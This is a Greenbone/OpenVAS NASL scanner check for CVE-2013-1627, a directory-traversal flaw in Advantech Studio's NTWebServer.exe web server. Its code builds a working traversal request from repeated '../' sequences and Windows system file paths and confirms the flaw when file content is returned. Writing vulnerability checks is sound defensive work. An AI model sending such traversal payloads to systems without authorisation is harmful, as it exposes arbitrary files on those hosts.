if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103636" );
	script_bugtraq_id( 56871 );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2013-1627" );
	script_name( "Advantech Studio 'NTWebServer.exe' Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/56871" );
	script_xref( name: "URL", value: "http://www.advantech.com/products/Advantech-Studio/mod_3D1B45B0-B0AF-405C-A9CC-A27B35774634.aspx" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-01-07 11:53:56 +0100 (Mon, 07 Jan 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "A Hotfix is available, contact the Vendor." );
	script_tag( name: "summary", value: "The Advantech Studio is prone to a directory-traversal vulnerability
because it fails to sufficiently sanitize user-supplied input.

A remote attacker can use directory-traversal strings to retrieve
arbitrary files in the context of the affected application.

Advantech Studio 7.0 is vulnerable. Other versions may also be
affected." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
url = "/startup.html";
if(!http_vuln_check( port: port, url: url, pattern: "Advantech", usecache: TRUE )){
	exit( 0 );
}
files = traversal_files( "windows" );
for file in keys( files ) {
	url = crap( data: "../", length: 9 * 6 ) + files[file];
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

